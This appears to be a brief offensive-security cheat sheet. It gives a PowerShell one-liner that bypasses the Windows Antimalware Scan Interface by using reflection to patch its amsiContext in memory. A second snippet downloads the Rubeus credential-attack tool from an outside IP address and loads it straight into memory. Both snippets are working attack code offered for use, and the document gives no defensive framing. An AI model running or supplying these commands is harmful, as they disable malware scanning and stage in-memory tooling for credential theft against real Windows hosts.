# Windows Antimalware Scan Interface ( AMSI ) Bypass


## reflexion

[source: Gustav Shen](https://gustavshen.medium.com/bypass-amsi-on-windows-11-75d231b2cac6)

1. Get the assembly that Ref is defined in, then get a list of all types defined in that assembly
2. In the list, locate AmsiUtils based on the property characteristics of AmsiUtils, such as IsPublic=False, IsSerial=False, and the Name contains the “iUtils” substring, etc.
3. Locate amsiContext in a similar manner
4. Get the address of the amsiContext parameter and patch the first DWORD in the structure to 0

```Powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like “*iUtils”) {$c=$b}};$d=$c.GetFields(‘NonPublic,Static’);Foreach($e in $d) {if ($e.Name -like “*Context”) {$f=$e}};$g=$f.GetValue($null);$ptr = [System.IntPtr]::Add([System.IntPtr]$g, 0x8);$buf = New-Object byte[](8);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 8)
```

## load c# tool

```Powershell
$data=(new-object System.Net.WebClient).DownloadData(‘http://192.168.0.45:443/rubeus.exe’)
$assembly=[System.Reflection.Assembly]::Load($data)
```